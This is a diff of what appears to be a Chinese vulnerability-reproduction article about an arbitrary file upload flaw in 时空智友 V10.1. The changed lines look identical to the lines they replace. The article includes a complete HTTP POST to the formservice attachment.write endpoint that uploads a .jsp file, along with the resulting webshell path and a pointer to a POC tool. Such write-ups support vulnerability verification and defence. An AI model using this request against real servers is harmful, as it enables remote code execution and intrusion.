@@ -34,7 +34,7 @@ CNVD 编号:
 3. 影响版本
 -------
 
-时空智友 V10.1 
+时空智友 V10.1 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YBymZRfqwDoGbWYZ5Nw2yXNb9X0QPte86VpIXlic6J0DBERbmgXbec9fHibsojia0WTMxlq33xfCeJA/640?wx_fmt=jpeg)
 
@@ -51,39 +51,39 @@ app="时空智友 V10.1"
 漏洞数据包：
 
 ```
-POST http://127.0.0.1/formservice?service=attachment.write&isattach=false&filename=a.jsp HTTP/1.1
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: keep-alive
-Content-Length: 9
+POST http://127.0.0.1/formservice?service=attachment.write&isattach=false&filename=a.jsp HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 9
 
 192513411
 
 
 ```
 
-上传成功后，会返回文件名。 
+上传成功后，会返回文件名。 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YBymZRfqwDoGbWYZ5Nw2yXedOLDZNgicDMWdbfdytmF5NlTE8ZCvJkv5eiafAJPs52tOibeBNwfaT1w/640?wx_fmt=jpeg)
 
 shell 地址：http://127.0.0.1/form/temp/202309212fq81zoqchav2jlq_a.jsp
 
-这里最后的文件名拼接上面返回的文件地址 
+这里最后的文件名拼接上面返回的文件地址 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YBymZRfqwDoGbWYZ5Nw2yXKEoYia63rRsTWtwIEX9vQcpByoTQ2XYn36LuWXLqhIsOINapxOmibKYw/640?wx_fmt=jpeg)
 
 6.POC&EXP
 ---------
 
-关注公众号  南风漏洞复现文库 并回复  漏洞复现 49  即可获得该 POC 工具下载地址： 
+关注公众号  南风漏洞复现文库 并回复  漏洞复现 49  即可获得该 POC 工具下载地址： 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YBymZRfqwDoGbWYZ5Nw2yXQictPiaM5t18eu8plVOKG2Y4eUjqsALibz1muuNHj9DziaM6hGOiaMB1wNA/640?wx_fmt=jpeg)
 
 7. 整改意见
 -------
 
-请关注厂商更新  https://www.sxskzy.com/
+请关注厂商更新  https://www.sxskzy.com/
 
 8. 往期回顾
 -------
